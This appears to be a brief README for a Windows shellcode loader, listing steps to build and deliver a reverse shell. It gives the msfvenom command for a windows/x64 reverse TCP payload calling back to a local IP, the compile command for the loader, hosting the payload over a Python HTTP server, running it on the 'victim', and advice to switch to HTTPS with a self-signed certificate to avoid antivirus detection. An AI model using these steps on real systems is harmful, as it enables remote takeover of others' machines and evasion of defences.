>To make this work,create a msfvenom payload

>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.175 LPORT=8000 -f raw >beacon.bin

>Compile .cpp using the command:- x86_64-w64-mingw32-g++ --static -o pay.exe simple.cpp -fpermissive -lws2_32

>Host the payload file using a http server :- python3 -m http.server


>Run the binary on the victim to get a call back.

>The payload will get detected after a while,make sure to use https encrypted payload.

>create your own ssl self signed certificate to use it for the https reverse payload ,since the one used by metasploit is signatured.
